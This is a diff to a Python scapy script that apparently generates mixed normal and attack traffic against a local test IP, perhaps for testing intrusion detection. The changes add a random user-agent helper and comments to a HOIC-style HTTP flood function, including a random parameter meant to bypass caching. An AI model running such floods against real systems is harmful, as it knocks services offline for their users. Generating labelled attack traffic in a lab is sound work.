@@ -5,12 +5,21 @@ from scapy.all import (
     IP, ICMP, UDP, TCP, ARP, DNS, DNSQR, DNSRR, Raw, send
 )
 
-# Target Information
-TARGET_IP = "192.168.64.4"  # Replace with your target IP
-TARGET_MAC = "ff:ff:ff:ff:ff:ff"  # Replace with your target MAC if needed
+TARGET_IP = "192.168.64.4"  # Change this to your target
+TARGET_MAC = "ff:ff:ff:ff:ff:ff"  # Default broadcast MAC
 NORMAL_TRAFFIC_RATIO = 50  # Percentage of normal traffic (e.g., 80% normal, 20% attacks)
 TEST_DURATION = 5 * 60  # 5 minutes in seconds
 SLEEP_DURATION = 1  # 3 seconds between each traffic generation
+
+# Helper function for random user agents - makes attacks more realistic
+def get_random_user_agent():
+    agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X)",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+        # Add more if needed
+    ]
+    return random.choice(agents)
 
 # Normal Traffic
 def normal_traffic_ping(target_ip):
@@ -29,8 +38,10 @@ def normal_traffic_http(target_ip):
 
 # 1. DDoS attack-HOIC (High Orbit Ion Cannon)
 def ddos_attack_hoic(num_packets):
+    """HOIC attack - simple but effective HTTP flood"""
     packets = []
     for _ in range(num_packets):
+        # Random param to bypass caching
         rand_param = random.randint(1000, 9999)
         payload = f"GET /?id={rand_param} HTTP/1.1\r\nHost: example.com\r\n\r\n"
         packet = IP(dst=TARGET_IP) / TCP(dport=80, flags="S") / Raw(load=payload)
